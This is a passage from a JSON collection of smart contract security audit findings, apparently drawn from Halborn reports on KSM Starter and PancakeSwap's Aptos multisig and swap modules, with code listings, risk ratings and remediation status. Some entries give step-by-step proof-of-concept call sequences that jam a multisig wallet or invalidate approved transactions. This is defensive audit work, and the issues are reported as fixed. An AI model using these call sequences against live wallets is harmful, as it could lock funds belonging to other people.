        "body": "In multiple functions KSMStarter uses OpenZeppelins safeTransferFrom and safeTransfer to handle the token transfers. These functions call transferFrom and transfer internally in the token contract to actually execute the transfer. However, since the actual amount transferred i.e. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom ERC20 token with the transferFrom or transfer function modified in such a way that it e.g. does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. In this case both tokens are set in the constructor by the creator of the contract, so they are trusted, but it would be still a good practice to perform this check. Code Location: Listing 12: IDO.sol 1 idoToken . safeTransfer ( msg . sender , claimable . idoTokenAmount ); 2 swapToken . safeTransferFrom ( msg . sender , address ( this ) , swapTokenAmount ); 3 swapToken . safeTransfer ( owner () , swapToken . balanceOf ( address ( this )) ); 4 idoToken . safeTransfer ( owner () , totalIdoTokens . sub ( totalSwapped )) ; Listing 13: KSTStaking.sol 1 _token . safeTransferFrom ( _msgSender () , address ( this ) , value ); 2 _token . safeTransfer ( _msgSender () , value ); 21 Listing 14: VestingCommunityIncentives.sol 1 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT ); 2 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT . mul ( multiplier )); 3 kstToken . safeTransfer ( beneficiary , kstToken . balanceOf ( address ( this ))); Listing 15: VestingTreasury.sol 1 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT ); 2 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT . mul ( multiplier )); 3 kstToken . safeTransfer ( beneficiary , kstToken . balanceOf ( address ( this ))); Listing 16: VestingMarketing.sol 1 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT ); 2 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT . mul ( multiplier )); 3 kstToken . safeTransfer ( beneficiary , kstToken . balanceOf ( address ( this ))); Listing 17: VestingTeam.sol 1 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT ); 2 kstToken . safeTransfer ( beneficiary , RELEASEAMOUNT . mul ( multiplier )); 3 kstToken . safeTransfer ( beneficiary , kstToken . balanceOf ( address ( this ))); Listing 18: KSMIDO.sol 1 paymentToken . safeTransferFrom ( msg . sender , address ( this ) , _paymentAmount ); 2 idoToken . safeTransfer ( msg . sender , sendAmount ); Risk Level: Likelihood - 2 Impact - 3 22 Recommendations: Whenever tokens are transferred, the delta of the previous (before transfer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: SOLVED: KSM-Starter team claims that tokens will always be ERC20 and validated on the client-side. Thus, only the owner is allowed to input these tokens in the smart contract. 23 ",
        "labels": [
            "Halborn",
            "KSM_Starter",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "During a manual review, the use of block.timestamp in IDO.sol, KSTStaking .sol, VestingCommunityIncentives.sol, VestingMarketing.sol, VestingTeam The contract developers .sol, and VestingTreasury.sol were observed. should be aware that this does not mean current time. now is an alias for block.timestamp. The value of block.timestamp can be influenced by miners to a certain degree, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Miners can influence the timestamp by a tolerance of 900 seconds. Code Location: Listing 19: IDO.sol (Lines 239,240,241,242,243) 239 240 241 242 243 244 require ( block . timestamp >= t1 . swapStart && block . timestamp <= t1 . swapEnd , \" IDO : t1 swap start / end not time \" ); require ( swap ( swapTokenAmount ) , \" IDO : t1 swap error . \"); Listing 20: IDO.sol (Lines 249,250,251,252,253) 249 250 251 252 253 254 require ( block . timestamp >= t2 . swapStart && block . timestamp <= t2 . swapEnd , \" IDO : t2 swap start / end not time \" ); require ( 24 Listing 21: IDO.sol (Lines 267,268,269,270,271) 267 268 269 270 271 272 require ( block . timestamp >= t3 . swapStart && block . timestamp <= t3 . swapEnd , \" IDO : t3 swap start / end not time \" ); require ( swap ( swapTokenAmount ) , \" IDO : t3 swap error . \"); Listing 22: IDO.sol (Lines 277,278,279,280,281) 277 278 279 280 281 282 require ( block . timestamp >= t4 . swapStart && block . timestamp <= t4 . swapEnd , \" IDO : t4 swap start / end not time \" ); require ( Listing 23: IDO.sol (Lines 291,292,293,294,295) 291 292 293 294 295 296 require ( block . timestamp >= t5 . swapStart && block . timestamp <= t5 . swapEnd , \" IDO : t5 swap start / end not time \" ); require ( Listing 24: IDO.sol (Lines 310) 310 311 require ( block . timestamp >= claimStartTime , \" IDO : Claim start not yet .\" ); require ( claimable . claimedAmount == 0 , \" IDO : Already claimed \" ); Listing 25: IDO.sol (Lines 452) 452 453 require ( block . timestamp >= t5 . swapEnd , \" IDO : Swap time not done yet \" ); uint256 totalSwapped = getTotalSwapped () ; 25 Listing 26: KSTStaking.sol (Lines 60) 60 61 require ( userUnlockTime > block . timestamp , \" KSTStaking : unlock is in the past \" ); if ( _unlockTime [ user ] < userUnlockTime ) { Listing 27: VestingCommunityIncentives.sol (Lines 36,37,38,39,40,41) 36 37 38 39 40 41 42 require ( block . timestamp >= startTime , \" start time not set \" ); require ( block . timestamp >= lastClaimTime . add ( CLAIM_DELAY ) , \" delay since last claim not passed \" ); if ( block . timestamp > END_DAY ) { claimDust () ; Listing 28: VestingCommunityIncentives.sol (Lines 45) 45 46 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 29: VestingCommunityIncentives.sol (Lines 63) 63 64 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 30: VestingCommunityIncentives.sol (Lines 72) 72 73 require ( block . timestamp >= END_DAY , \" Vesting not yet finished \"); kstToken . safeTransfer ( Listing 31: VestingMarketing.sol (Lines 36,37,38,39,40,41) 36 37 38 39 require ( block . timestamp >= startTime , \" start time not set \" ); require ( block . timestamp >= lastClaimTime . add ( CLAIM_DELAY ) , \" delay since last claim not passed \" 26 40 41 42 ); if ( block . timestamp > END_DAY ) { claimDust () ; Listing 32: VestingMarketing.sol (Lines 45) 45 46 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 33: VestingMarketing.sol (Lines 63) 63 64 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 34: VestingMarketing.sol (Lines 72) 72 73 require ( block . timestamp >= END_DAY , \" Vesting not yet finished \"); kstToken . safeTransfer ( Listing 35: VestingTeam.sol (Lines 36,37,38,39,40,41) 36 37 38 39 40 41 42 require ( block . timestamp >= startTime , \" start time not set \" ); require ( block . timestamp >= lastClaimTime . add ( CLAIM_DELAY ) , \" delay since last claim not passed \" ); if ( block . timestamp > END_DAY ) { claimDust () ; Listing 36: VestingTeam.sol (Lines 45) 45 46 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); 27 Listing 37: VestingTeam.sol (Lines 63) 63 64 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 38: VestingTeam.sol (Lines 72) 72 73 require ( block . timestamp >= END_DAY , \" Vesting not yet finished \"); kstToken . safeTransfer ( Listing 39: VestingTreasury.sol (Lines 36,37,38,39,40,41) 36 37 38 39 40 41 42 require ( block . timestamp >= startTime , \" start time not set \" ); require ( block . timestamp >= lastClaimTime . add ( CLAIM_DELAY ) , \" delay since last claim not passed \" ); if ( block . timestamp > END_DAY ) { claimDust () ; Listing 40: VestingTreasury.sol (Lines 45) 45 46 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 41: VestingTreasury.sol (Lines 63) 63 64 if ( currentEpoch > epoch ) { uint256 multiplier = currentEpoch . sub ( epoch ); Listing 42: VestingTreasury.sol (Lines 72) 72 73 require ( block . timestamp >= END_DAY , \" Vesting not yet finished \"); kstToken . safeTransfer ( 28 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: RISK ACCEPTED: The KSM-Starter team accepts the risk and continues using block.timestamp as 900 seconds fluctuation is not very crucial to the client. 29 ",
        "labels": [
            "Halborn",
            "KSM_Starter",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "KSM contract IDOFactory.sol, KST.sol, IDO.sol, KSMIDO.sol, KSTStaking.sol , IKSTStaking.sol, TestERC20.sol, KSMStarterLotteryRNG.sol, and USDT.sol uses the floating pragma 0.8.6. Contract should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. Code Location: Listing 43: (Lines 2) 1 // SPDX - License - Identifier : MIT 2 pragma solidity ^0.8.6; Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider locking the pragma version with known bugs for the compiler version. When possible, do not use floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. 30 Remediation Plan: SOLVED: KSM-Starter team locked the pragma version. 31 ",
        "labels": [
            "Halborn",
            "KSM_Starter",
            "Severity: Low"
        ]
    },
    {
        "title": "OUTDATED DEPENDENCIES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "It was noticed that the 4.1.0 version of openzepplin-contracts is used in smart contracts. However, the latest version of those libraries is 4.3.2, which fixes a vulnerability in UUPSUpgradeable. Code Location: Listing 44: package.json (Lines 27) \" dependencies \": { \" @chainlink / contracts \" : \" ^0.2.0 \" , \" @openzeppelin / contracts \" : \" ^4.1.0 \" , \" @openzeppelin / test - helpers \" : \" ^0.5.11 \" , \" dotenv \" : \" ^10.0.0 \" } 25 26 27 28 29 30 31 } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Even though UUPSUpgradeable is not used directly within contracts, it is always important to keep all libraries up-to-date. References: Open Zeppelin Advisory UUPS Implementation Workaround 32 Remediation Plan: SOLVED: version to 4.3.2. KSM-Starter team updated the library openzepplin-contracts 33 ",
        "labels": [
            "Halborn",
            "KSM_Starter",
            "Severity: Low"
        ]
    },
    {
        "title": "PRAGMA TOO RECENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "KSM contract uses one of the latest pragma version (0.8.6) which was released on June 22nd, 2021. The latest pragma version (0.8.7) was released in August 2021. Many pragma versions have been lately released, going from version 0.7.x to the recently released version 0.8.x. in just 6 months. Reference: https://github.com/ethereum/solidity/releases In the Solitidy Github repository, there is a json file where are all bugs finding in the different compiler versions. It should be noted that pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_- by_version.json Code Location: Listing 45: (Lines 2) 1 // SPDX - License - Identifier : MIT 2 pragma solidity ^0.8.6; Risk Level: Likelihood - 1 Impact - 2 34 Recommendations: If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities such as pragma between 0.6.12 - 0.7.6. Remediation Plan: Risk-Accepted: The KSM-Starter team accepts the risk and continues using pragma version 0.8.6. 35 ",
        "labels": [
            "Halborn",
            "KSM_Starter",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING EVENTS EMITTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/KSM_Starter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "It has been observed that important functionality is missing emitting event for some functions on the IDO.sol contract. These functions should emit events. Events are a method of informing the transaction initiator about the actions taken by the called function. It logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. These functions should emit events. Code Location: Listing 46: IDO.sol (Lines 443) 440 441 442 443 444 function setSwapPrice ( uint256 _price ) external ownerOrOperator { require (! priceSet , \" IDO : price already set . \"); priceSet = true ; swapPrice = _price ; } Listing 47: IDO.sol (Lines 461) 459 460 461 462 function setOperator ( address _operator ) public ownerOrOperator { require ( _operator != address (0) ) ; operator = _operator ; } Risk Level: Likelihood - 1 Impact - 2 36 Recommendations: For best security practices, consider as much as possible declaring events at the end of the function. Events can be used to detect the end of the operation. Remediation Plan: SOLVED: KSM-Starter team added events to the above function. 37 3.10 (HAL-10) POSSIBLE MISUSE OF PUBLIC FUNCTIONS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "KSM_Starter",
            "Severity: Informational"
        ]
    },
    {
        "title": "FUNCTION TO SET THRESHOLD CAN GET THE MULTISIG WALLETS TOTALLY STUCK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "init_set_threshold and init_remove_owner can be called in parallel during usual operations in multisig wallets. However, this behavior can produce a situation where threshold becomes greater than number of owners. As a consequence, multisig wallets can get totally stuck, i.e.: no more transactions or withdrawals can be done on behalf of them. It is important to note that the likelihood of this situation to happen drastically increases because pancake-multisig-wallet contract is planned to be used as a library for extended implementations of multisig wallets by the community. Here is a proof of concept showing how to exploit this security issue: Proof of Concept: Initial situation: 3 owners and threshold is 2 1. Owner 1 calls init_set_threshold function to change the threshold to 3. 2. Owner 2 calls approve_set_threshold function. 3. Owner 1 calls init_remove_owner function. 4. Owner 2 calls approve_remove_owner function. 5. Owner 1 calls execute_set_threshold function and now the threshold is 3. 6. Owner 3 calls approve_remove_owner function. 7. Owner 2 calls execute_remove_owner function and now there are only 2 owners. 8. Finally, the multisig wallet gets totally stuck because there are only 2 owners, but the threshold is 3. 13 Final situation: 2 owners and threshold is 3 Code Location: Listing 1: pancake-multisig-wallet/sources/multisig_wallet.move (Lines 422-424) 412 let multisig_txs = borrow_global_mut < MultisigTxs < ParamsType > >(  multisig_wallet_addr ); 413 let tx = Table :: borrow_mut (& mut multisig_txs . txs , seq_number ); 414 assert !( Table :: length (& tx . approvals ) >= ( multisig_wallet . threshold  as u64 ) , ERROR_LESS_THAN_THRESHOLD ); 415 assert !( tx . owners_seq_number == multisig_wallet . owners_seq_number ,  ERROR_OWNERS_SEQ_NUMBER_NOT_MATCH ); 416 tx . is_executed = true ; 417 multisig_wallet . last_executed_seq_number = seq_number ; 418 419 assert !( timestamp :: now_seconds () >= tx . eta ,  ERROR_TIMELOCK_NOT_SURPASSED ); 420 assert !( timestamp :: now_seconds () < tx . expiration ,  ERROR_MULTISIG_TX_EXPIRED ); 421 422 if ( type_info :: type_name < ParamsType >() == type_info :: type_name <  RemoveOwnerParams >() ) { 423 multisig_wallet . owners_seq_number = multisig_wallet .  owners_seq_number + 1; 424 }; 14 Risk Level: Likelihood - 5 Impact - 5 Recommendation: Update the logic of execute_multisig_tx function to increase the value of owners_seq_number by 1 every time the amount of owners or the value of the threshold are modified. Remediation plan: SOLVED: The issue was fixed in commit 0a4fde8. 15 ",
        "labels": [
            "Halborn",
            "PancakeSwap_Aptos_DEX_Move",
            "Severity: Critical"
        ]
    },
    {
        "title": "APPROVED TRANSACTIONS CAN BE INVALIDATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "execute_multisig_tx function allows that an owner maliciously (or mis- takenly) invalidates an approved transaction. As a consequence, every transaction, like adding / removing an owner, setting a new threshold or withdrawing from the multisig wallet, can always be invalidated by just 1 malicious owner, even if the transaction goes to approval again and again. It is important to note that the likelihood of this situation to happen drastically increases because pancake-multisig-wallet contract is planned to be used as a library for extended implementations of multisig wallets by the community. Here is a proof of concept showing how to exploit this security issue: Proof of Concept: Initial situation: 3 owners and threshold is 2 1. Owner 1 calls init_set_threshold function to change the threshold to 1. 16 2. Owner 2 calls approve_set_threshold function and now the transaction is ready to be executed. 3. Any of the owners calls execute_multisig_tx function. The result is successful and an ExecuteMultisigTxEvent event is emitted. However, the threshold does not change. 17 4. If any of the owners calls execute_set_threshold function, it will throw an error message because the approved transaction became invalidated. Code Location: Listing 2: pancake-multisig-wallet/sources/multisig_wallet.move (Lines 406,410,417) 406 public fun execute_multisig_tx < ParamsType : copy + store >( sender : &  signer , multisig_wallet_addr : address , seq_number : u64 ) acquires  MultisigWallet , MultisigTxs , MultisigWalletEvents { let sender_addr = signer :: address_of ( sender ); let multisig_wallet = borrow_global_mut < MultisigWallet >( 407 408  multisig_wallet_addr ); 409 assert !( Table :: contains (& multisig_wallet . owners , sender_addr ) ,  ERROR_NOT_OWNER ); 410 assert !( multisig_wallet . last_executed_seq_number == MAX_U64 ||  seq_number > multisig_wallet . last_executed_seq_number ,  ERROR_MULTISIG_TX_INVALIDATED ); 411 412 let multisig_txs = borrow_global_mut < MultisigTxs < ParamsType > >(  multisig_wallet_addr ); 413 414 let tx = Table :: borrow_mut (& mut multisig_txs . txs , seq_number ); assert !( Table :: length (& tx . approvals ) >= ( multisig_wallet .  threshold as u64 ) , ERROR_LESS_THAN_THRESHOLD ); 415 assert !( tx . owners_seq_number == multisig_wallet .  owners_seq_number , ERROR_OWNERS_SEQ_NUMBER_NOT_MATCH ); 416 417 tx . is_executed = true ; multisig_wallet . last_executed_seq_number = seq_number ; Risk Level: Likelihood - 5 Impact - 3 18 Recommendation: Make use of capabilities in execution functions to avoid that someone maliciously or mistakenly calls execute_multisig_tx function and inval- idates approved transactions. Remediation plan: SOLVED: The issue was fixed in commit d09bfd6. 19 ",
        "labels": [
            "Halborn",
            "PancakeSwap_Aptos_DEX_Move",
            "Severity: High"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESS TRANSFERRED WITHOUT CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The set_admin function from swap module could set the admin to an invalid address mistakenly, unwillingly losing control of pancake-swap contract, which cannot be undone in any way. Currently, the admin of the contract can change its address using the aforementioned function in a single transaction and without confirmation from the new address. Since the admin is planned to be a multisig contract, the likelihood of this scenario to happen is very low, but it is included in the report as a preventive measure, applying the security-in-depth approach. Code Location: Listing 3: pancake-swap/sources/swap/swap.move (Lines 701-702) 698 public entry fun set_admin ( sender : & signer , new_admin : address )  acquires SwapInfo { let sender_addr = signer :: address_of ( sender ); let swap_info = borrow_global_mut < SwapInfo >( RESOURCE_ACCOUNT ); assert !( sender_addr == swap_info . admin , ERROR_NOT_ADMIN ); swap_info . admin = new_admin ; 699 700 701 702 703 } Risk Level: Likelihood - 1 Impact - 4 20 Recommendation: It is recommended to split admin transfer functionality into set_admin and accept_admin functions. The latter function allows the transfer to be completed by the recipient. Remediation plan: RISK ACCEPTED: The PancakeSwap team accepted the risk of this finding and also stated that they will mitigate this issue from the Ops side. 21 ",
        "labels": [
            "Halborn",
            "PancakeSwap_Aptos_DEX_Move",
            "Severity: Low"
        ]
    },
    {
        "title": "INSECURE MINIMUM THRESHOLD WHEN INITIALIZING MULTISIG WALLETS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Multisig wallets can be initialized as long as the threshold (i.e.: minimum amount of approvals for a transaction to be later executed) is greater or equal than 1. This default validation is not inherently secure and the good practices for handling multisig wallets recommend a reasonably secure setup for threshold (e.g.: 2 of 3, 3 of 5, etc.) in case 1 or more owners are malicious, or their keys get compromised. Code Location: Minimum threshold is set in 1: Listing 4: pancake-multisig-wallet/sources/multisig_wallet.move (Line 36) 35 const MAX_U64 : u64 = 18446744073709551615; 36 const MIN_THRESHOLD : u8 = 1; Multisig wallets are initialized as long as threshold is greater or equal than minimum threshold (1), no matter how many owners are included in the wallet: Listing 5: pancake-multisig-wallet/sources/multisig_wallet.move (Line 133) 131 public fun initialize ( sender : & signer , owner_addresses : vector <  address >, threshold : u8 ) { 132 133 let num_owners = vector :: length (& owner_addresses ); assert !( threshold >= MIN_THRESHOLD ,  ERROR_LESS_THAN_MIN_THRESHOLD ); 134 assert !(( threshold as u64 ) <= num_owners ,  ERROR_MORE_THAN_NUM_OWNERS ); 22 Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended that multisig_wallet module allows creators to define a ratio when initializing wallets, so the threshold can be secure enough according to the amount of owners included in the wallets. For example, if the ratio is 33% and the amount of owners is 6, the threshold in this multisig wallet is required to be greater or equal than 2 (not just 1). Remediation plan: RISK ACCEPTED: The PancakeSwap team accepted the risk of this finding and also stated that they will mitigate this issue from the Ops side. 23 ",
        "labels": [
            "Halborn",
            "PancakeSwap_Aptos_DEX_Move",
            "Severity: Low"
        ]
    },
    {
        "title": "MINIMUM THRESHOLD IN MULTISIG WALLETS IS NOT UPDATED SECURELY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The amount of owners or the threshold in multisig wallets can be updated as long as the threshold (i.e.: minimum amount of approvals for a transaction to be later executed) is greater or equal than 1. This verification does not guarantee that the new setup for the wallet after the update follows the good practices for handling multisig wallets, e.g.: 2 approvers out of 3 owners, 3 of 5, etc. Code Location: init_add_owner function only verifies that the new owner does not already exist, but does not check that the threshold remains reasonably secure after adding one more owner: Listing 6: pancake-multisig-wallet/sources/multisig_wallet.move (Line 249) 247 public fun init_add_owner ( sender : & signer , multisig_wallet_addr :  address , eta : u64 , expiration : u64 , owner : address ) acquires  MultisigWallet , MultisigTxs , MultisigWalletEvents { 248 let multisig_wallet = borrow_global < MultisigWallet >(  multisig_wallet_addr ); 249 assert !(! Table :: contains (& multisig_wallet . owners , owner ) ,  ERROR_OWNER_ALREADY_EXIST ); 250 init_multisig_tx < AddOwnerParams >( sender , multisig_wallet_addr ,  eta , expiration , AddOwnerParams { owner , }) ; 251 252 253 } 24 init_set_threshold function only verifies that the new threshold is greater or equal than minimum threshold (1), no matter how many own- ers are included in the wallet: Listing 7: pancake-multisig-wallet/sources/multisig_wallet.move (Line 267) 264 public fun init_set_threshold ( sender : & signer ,  multisig_wallet_addr : address , eta : u64 , expiration : u64 ,  threshold : u8 ) acquires MultisigWallet , MultisigTxs ,  MultisigWalletEvents { 265 let multisig_wallet = borrow_global < MultisigWallet >(  multisig_wallet_addr ); 266 assert !(( threshold as u64 ) <= Table :: length (& multisig_wallet .  owners ) , ERROR_MORE_THAN_NUM_OWNERS ); assert !( threshold >= MIN_THRESHOLD , 267  ERROR_LESS_THAN_MIN_THRESHOLD ); 268 init_multisig_tx < SetThresholdParams >( sender ,  multisig_wallet_addr , eta , expiration , SetThresholdParams { threshold , }) ; 269 270 271 } Risk Level: Likelihood - 1 Impact - 3 Recommendation: is to logic update recommended It and the init_set_threshold functions to allow changes only if threshold value remains reasonably secure. The proposed ratio value can be helpful for this purpose, see the recommendation for the following issue for more details: (HAL-04) INSECURE MINIMUM THRESHOLD WHEN INITIALIZING MULTISIG WALLETS. init_add_owner of 25 Remediation plan: RISK ACCEPTED: The PancakeSwap team accepted the risk of this finding and also stated that they will mitigate this issue from the Ops side. 26 ",
        "labels": [
            "Halborn",
            "PancakeSwap_Aptos_DEX_Move",
            "Severity: Low"
        ]
    },
    {
        "title": "ETA IS NOT COMPLETELY VERIFIED WHEN INITIATING MULTISIG TRANSACTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The following functions in multisig_wallet module do not verify that eta is greater than current timestamp at initiating multisig transactions:  init_add_owner  init_remove_owner  init_set_threshold  init_withdraw  init_multisig_tx As a consequence, an owner can mistakenly make a multisig transaction available to be executed before it is expected. Code Location: Listing 8: Affected resources 1 Module : 2 ====== 3 multisig_wallet 4 5 Functions : 6 ========= 7 init_add_owner : L #247 8 init_remove_owner : L #255 9 init_set_threshold : L #264 10 init_withdraw : L #283 11 init_multisig_tx : L #295 27 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to update the logic of the functions mentioned above to verify that eta is greater than current timestamp for initiating multisig transactions. Remediation plan: RISK ACCEPTED: The PancakeSwap team accepted the risk of this finding and also stated that they will mitigate this issue from the Ops side. 28 ",
        "labels": [
            "Halborn",
            "PancakeSwap_Aptos_DEX_Move",
            "Severity: Low"
        ]
    },
    {
        "title": "MISLEADING ERROR MESSAGES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Error messages shown in certain sections of code have inaccurate infor- mation, which could mislead legitimate users if these messages appear during a failed operation in pancake-swap contract while swapping. Code Location: The following functions used during swapping operations will throw the ERROR_INSUFFICIENT_OUTPUT_AMOUNT error message when the value of certain output coin is different from zero. However, this error message could mislead users and make them think that the operation failed because no enough output coins were generated during the swapping, which is not true and does not explain the root cause of the error: Listing 9: pancake-swap/sources/swap/swap.move (Line 448) 440 public ( friend ) fun swap_exact_x_to_y_direct <X , Y >( 441 442 ): ( coin :: Coin <X >, coin :: Coin <Y >) acquires TokenPairReserve , coins_in : coin :: Coin <X >  TokenPairMetadata { 443 444 445 446 let amount_in = coin :: value <X >(& coins_in ); deposit_x <X , Y >( coins_in ); let ( rin , rout , _) = token_reserves <X , Y >() ; let amount_out = swap_utils :: get_amount_out ( amount_in , rin , rout  ); 447 448 let ( coins_x_out , coins_y_out ) = swap <X , Y >(0 , amount_out ); assert !( coin :: value <X >(& coins_x_out ) == 0,  ERROR_INSUFFICIENT_OUTPUT_AMOUNT ); ( coins_x_out , coins_y_out ) 449 450 } 29 Listing 10: pancake-swap/sources/swap/swap.move (Line 471) 466 public ( friend ) fun swap_x_to_exact_y_direct <X , Y >( 467 468 ): ( coin :: Coin <X >, coin :: Coin <Y >) acquires TokenPairReserve , coins_in : coin :: Coin <X >, amount_out : u64  TokenPairMetadata { 469 470 471 deposit_x <X , Y >( coins_in ); let ( coins_x_out , coins_y_out ) = swap <X , Y >(0 , amount_out ); assert !( coin :: value <X >(& coins_x_out ) == 0,  ERROR_INSUFFICIENT_OUTPUT_AMOUNT ); ( coins_x_out , coins_y_out ) 472 473 } Listing 11: pancake-swap/sources/swap/swap.move (Line 509) 504 public ( friend ) fun swap_y_to_exact_x_direct <X , Y >( 505 506 ): ( coin :: Coin <X >, coin :: Coin <Y >) acquires TokenPairReserve , coins_in : coin :: Coin <Y >, amount_out : u64  TokenPairMetadata { 507 508 509 deposit_y <X , Y >( coins_in ); let ( coins_x_out , coins_y_out ) = swap <X , Y >( amount_out , 0) ; assert !( coin :: value <Y >(& coins_y_out ) == 0,  ERROR_INSUFFICIENT_OUTPUT_AMOUNT ); ( coins_x_out , coins_y_out ) 510 511 } Listing 12: pancake-swap/sources/swap/swap.move (Line 522) 514 public ( friend ) fun swap_exact_y_to_x_direct <X , Y >( 515 516 ): ( coin :: Coin <X >, coin :: Coin <Y >) acquires TokenPairReserve , coins_in : coin :: Coin <Y >  TokenPairMetadata { 517 518 519 520 let amount_in = coin :: value <Y >(& coins_in ); deposit_y <X , Y >( coins_in ); let ( rout , rin , _) = token_reserves <X , Y >() ; let amount_out = swap_utils :: get_amount_out ( amount_in , rin , rout  ); 521 522 let ( coins_x_out , coins_y_out ) = swap <X , Y >( amount_out , 0) ; assert !( coin :: value <Y >(& coins_y_out ) == 0,  ERROR_INSUFFICIENT_OUTPUT_AMOUNT ); ( coins_x_out , coins_y_out ) 523 524 } 30 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Correct error messages to show more accurate information and to avoid confusing users if these messages appear. Remediation plan: ACKNOWLEDGED: The PancakeSwap team acknowledged this finding. 31 ",
        "labels": [
            "Halborn",
            "PancakeSwap_Aptos_DEX_Move",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNNECESSARY USE OF MUTABLE REFERENCES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Move Smart Contract Audits/PancakeSwap_Aptos_DEX_Move_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "admin and fee_to functions in swap module use mutable references whose values are not later changed. This issue does not trigger an exploitable scenario, but is included in the report as a good practice based on the principle of least privilege. Code Location: Functions that make unnecessary use of mutable references: Listing 13: pancake-swap/sources/swap/swap.move (Line 273) 272 public fun admin () : address acquires SwapInfo { 273 274 275 } let swap_info = borrow_global_mut < SwapInfo >( RESOURCE_ACCOUNT ); swap_info . admin Listing 14: pancake-swap/sources/swap/swap.move (Line 278) 277 public fun fee_to () : address acquires SwapInfo { 278 279 280 } let swap_info = borrow_global_mut < SwapInfo >( RESOURCE_ACCOUNT ); swap_info . fee_to Risk Level: Likelihood - 1 Impact - 1 32 Recommendation: It is recommended to utilize immutable references by using borrow_global operation instead of borrow_global_mut in the functions mentioned above. Remediation plan: ACKNOWLEDGED: The PancakeSwap team acknowledged this finding. 33 ",
        "labels": [
            "Halborn",
            "PancakeSwap_Aptos_DEX_Move",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED FUNCTIONS",
